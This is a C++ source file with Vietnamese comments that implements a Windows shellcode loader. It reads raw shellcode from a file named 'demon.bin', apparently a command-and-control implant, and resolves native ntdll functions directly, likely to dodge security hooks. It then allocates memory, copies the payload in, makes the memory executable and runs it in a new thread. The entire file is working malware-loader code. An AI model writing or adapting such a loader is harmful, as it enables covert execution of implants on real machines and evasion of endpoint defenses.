#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(WINAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(WINAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

std::vector<unsigned char> read_shellcode_from_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::cerr << "[!] Không thể mở file " << filename << std::endl;
        exit(1);
    }
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), {});
}

int main() {
    // Đọc shellcode trực tiếp từ demon.bin (không mã hóa)
    std::vector<unsigned char> shellcode = read_shellcode_from_file("demon.bin");

    SIZE_T shellcode_size = shellcode.size();
    PVOID exec_mem = NULL;
    HANDLE hThread;

    // Lấy handle tới ntdll.dll và các hàm cần thiết
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // Cấp phát bộ nhớ cho shellcode
    pNtAllocateVirtualMemory(GetCurrentProcess(), &exec_mem, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Sao chép shellcode vào bộ nhớ
    memcpy(exec_mem, shellcode.data(), shellcode_size);

    // Thay đổi quyền truy cập bộ nhớ thành thực thi
    ULONG oldProtect;
    pNtProtectVirtualMemory(GetCurrentProcess(), &exec_mem, &shellcode_size, PAGE_EXECUTE_READ, &oldProtect);

    // Tạo thread để thực thi shellcode
    pNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)exec_mem, NULL, FALSE, 0, 0, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
